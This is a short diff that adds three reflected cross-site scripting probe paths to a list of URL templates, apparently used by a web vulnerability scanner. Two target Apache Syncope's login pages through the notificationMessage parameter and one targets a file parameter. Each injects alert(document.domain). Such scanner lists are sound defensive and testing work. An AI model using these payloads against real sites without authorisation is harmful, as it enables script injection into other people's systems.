@@ -722,3 +722,6 @@
 /w/index.php?title=Special:Ask&q=%5B%5BProperty%3A%2B%5D%5D&p%5Bformat%5D=table&p%5Bheaders%5D=plain&p%5Bmainlabel%5D={{url_encode(payload)}}&p%5Blimit%5D=1
 /index.php?title=Special:Ask&q=%5B%5BProperty%3A%2B%5D%5D&p%5Bcursor%5D={{url_encode(base64(cursor))}}
 /w/index.php?title=Special:Ask&q=%5B%5BProperty%3A%2B%5D%5D&p%5Bcursor%5D={{url_encode(base64(cursor))}}
+/syncope-console/login?notificationMessage={{str}}%27%2Balert%28document.domain%29%2B%27
+/syncope-enduser/?notificationMessage={{str}}%27%2Balert%28document.domain%29%2B%27
+/?file=__new__{{randstr}}%27-alert(document.domain)-%27
